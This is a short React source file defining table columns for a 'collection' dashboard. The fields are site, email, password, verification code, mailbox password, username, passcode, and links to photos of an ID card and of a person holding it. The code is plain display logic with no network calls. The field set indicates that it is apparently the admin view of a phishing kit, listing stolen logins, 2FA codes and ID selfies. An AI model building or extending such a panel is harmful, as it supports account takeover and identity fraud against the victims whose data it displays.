import Link from "next/link";
import { getTimeDistance } from "../../../utils/getTimeDistance";

export const collectionColumn = [
  {
    Header: "website",
    accessor: "site",
    width: "auto",
  },
  {
    Header: "email",
    accessor: "email",
    width: "auto",
  },
  {
    Header: "password",
    accessor: "password",
    width: "auto",
    // minWidth: 150,
  },
  {
    Header: "Code",
    accessor: "skipcode",
    width: "auto",
  },
  {
    Header: "Mail",
    accessor: "mail",
    width: "auto",
    // minWidth: 100,
  },
  {
    Header: "mail Password",
    accessor: "mailPass",
    width: "auto",
    minWidth: 160,
  },
  {
    Header: "Username",
    accessor: "username",
    width: "auto",
    // minWidth: 150,
  },
  {
    Header: "Passcode",
    accessor: "passcode",
    width: "auto",
    // minWidth: 150,
  },

  {
    Header: "Only Card",
    accessor: "onlyCard",
    disableSortBy: true,
    width: "auto",
    // minWidth: 150,
    Cell: ({ row }) => (
      <div className="flex justify-center items-center">
        {row.original.onlyCard && (
          <Link href={row.original.onlyCard} target="_blank">
            <p className="text-sm text-blue-500 hover:text-blue-700 transition-colors duration-200">
              View Image
            </p>
          </Link>
        )}
      </div>
    ),
  },
  {
    Header: "Holding Card",
    accessor: "holdingCard",
    disableSortBy: true,
    // width: 200,
    // minWidth: 150,
    width: "auto",
    Cell: ({ row }) => (
      <div className="flex justify-center items-center">
        {row.original.holdingCard && (
          <Link href={row.original.holdingCard} target="_blank">
            <p className="text-sm text-blue-500 hover:text-blue-700 transition-colors duration-200">
              View Image
            </p>
          </Link>
        )}
      </div>
    ),
  },
  {
    Header: "Time",
    accessor: "createdAt",
    disableSortBy: true,
    width: "auto",
    // minWidth: 150,
    Cell: ({ row }) => (
      <div className="flex justify-center items-center">
        {row.original.createdAt && getTimeDistance(row.original.createdAt)}
      </div>
    ),
  },
  // {
  //   Header: "verify_code",
  //   accessor: "verify_code",
  // },
  // {
  //   Header: "date_time",
  //   accessor: "date_time",
  // },
  // {
  //   Header: "date_time",
  //   accessor: "date_time",
  //   Cell: ({ value }) => {
  //     return format(new Date(value), "dd/MM/yyyy");
  //   },
  // },
];
